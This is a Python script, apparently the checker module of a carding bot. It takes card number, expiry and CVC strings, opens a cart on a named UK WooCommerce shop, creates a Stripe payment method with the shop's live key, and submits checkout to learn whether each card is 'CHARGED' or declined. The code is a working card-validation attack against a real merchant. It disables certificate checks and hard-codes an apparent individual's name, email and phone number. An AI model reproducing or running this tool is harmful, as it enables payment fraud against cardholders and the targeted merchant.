import os
import requests
import re
import json
import random
import string
from uuid import uuid4

# تجاهل تحذيرات الشهادات الأمنية
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def stripe(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) != 4: 
            return "Invalid Card Format"
            
        n = parts[0].replace(' ', '')
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3].replace('\n', '')
        if len(yy) == 4: 
            yy = yy[-2:]
    except Exception:
        return "Invalid Card Format"

    site_url = 'https://www.gbradburyltd.co.uk'
    stripe_pk = 'pk_live_51TXK24JwY9cexbFxKOcl5gPMw7QPuRmBoTUh2SR2sNo8tGYZbjwSdKi6c6rzH8CnuelNtDdCXSkwBxTzP704o6eM00beQr7w6p'

    session = requests.Session()
    session.verify = False
    
    # 1. تهيئة الجلسة وجلب الكوكيز والـ Nonce وفتح السلة للمتجر
    try:
        session.get(f'{site_url}/', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'}, timeout=10)
        
        cart_data = {
            'success_message': '"1 LT BRACKET 1x1" has been added to your cart',
            'product_sku': 'D023AEV',
            'product_id': '1780',
            'quantity': '1',
        }
        session.post(f'{site_url}/', params={'wc-ajax': 'add_to_cart'}, data=cart_data, timeout=10)
        
        get_checkout = session.get(f'{site_url}/checkout/', timeout=10)
        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', get_checkout.text)
        checkout_nonce = nonce_match.group(1) if nonce_match else '29829fefec'
    except Exception:
        checkout_nonce = '29829fefec'

    # 2. إعدادات ريكوست Stripe
    stripe_url = 'https://api.stripe.com/v1/payment_methods'
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/v3/fa46e8c816/m/parent.html',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    }
    
    client_session_id = str(uuid4())
    elements_session_id = f"elements_session_{''.join(random.choices(string.ascii_letters + string.digits, k=12))}"
    
    stripe_data = {
        'billing_details[name]': 'Eslam Ramadan',
        'billing_details[email]': 'eslamramadanv1@gmail.com',
        'billing_details[phone]': '+201153262807',
        'billing_details[address][city]': 'London',
        'billing_details[address][country]': 'GB',
        'billing_details[address][line1]': '15 High Street',
        'billing_details[address][postal_code]': 'EC1A 1BB',
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'payment_user_agent': 'stripe.js/9e9080bb94; stripe-js-v3/9e9080bb94; payment-element; deferred-intent; autopm',
        'referrer': f'{site_url}/checkout/',
        'time_on_page': str(random.randint(30000, 120000)),
        'client_attribution_metadata[client_session_id]': client_session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
        'client_attribution_metadata[elements_session_id]': elements_session_id,
        'client_attribution_metadata[elements_session_config_id]': str(uuid4()),
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'key': stripe_pk,
        '_stripe_version': '2025-09-30.clover'
    }

    try:
        r1 = session.post(stripe_url, headers=stripe_headers, data=stripe_data, timeout=15)
        r1_json = r1.json()
        
        if 'id' not in r1_json:
            err_text = r1_json.get('error', {}).get('message', 'Stripe Error')
            return f"Declined: {err_text}"
            
        payment_method_id = r1_json['id']
    except Exception:
        return "Declined: Connection Error on Stripe"

    # 3. إتمام الـ Checkout في المتجر
    checkout_url = f'{site_url}/?wc-ajax=checkout'
    checkout_headers = {
        'authority': 'www.gbradburyltd.co.uk',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': site_url,
        'referer': f'{site_url}/checkout/',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    }
    
    checkout_data = {
        'billing_email': 'eslamramadanv1@gmail.com',
        'billing_first_name': 'Eslam',
        'billing_last_name': 'Ramadan',
        'billing_country': 'GB',
        'billing_address_1': '15 High Street',
        'billing_city': 'London',
        'billing_postcode': 'EC1A 1BB',
        'billing_phone': '+201153262807',
        'shipping_country': 'GB',
        'shipping_method[0]': 'wbs:5:83d48455_standard_delivery',
        'payment_method': 'stripe',
        'wc-stripe-selected-upe-payment-type': 'card',
        'terms': 'on',
        'terms-field': '1',
        'woocommerce-process-checkout-nonce': checkout_nonce,
        '_wp_http_referer': f'{site_url}/checkout/',
        'wc-stripe-payment-method': payment_method_id
    }

    try:
        r2 = session.post(checkout_url, headers=checkout_headers, data=checkout_data, timeout=15)
        res_json = r2.json()
        messages = str(res_json.get('messages', ''))
        
        # التقاط حالة النجاح وإرجاعها بشكل صحيح ليتعرف عليها البوت
        if "success" in str(res_json.get('result', '')) or "CHARGED" in messages or "Thank you" in messages:
            return "[CHARGED / SUCCESS]"
        
        clean_msg = re.sub(r'<[^>]+>', '', messages).strip()
        return clean_msg if clean_msg else "Declined"
    except Exception:
        return "Declined: Error in Checkout Response"

def stripe_charge(ccx):
    return stripe(ccx)

def scc(ccx):
    return stripe(ccx)

def st(ccx):
    return stripe(ccx)

def vbv(ccx):
    return stripe(ccx)
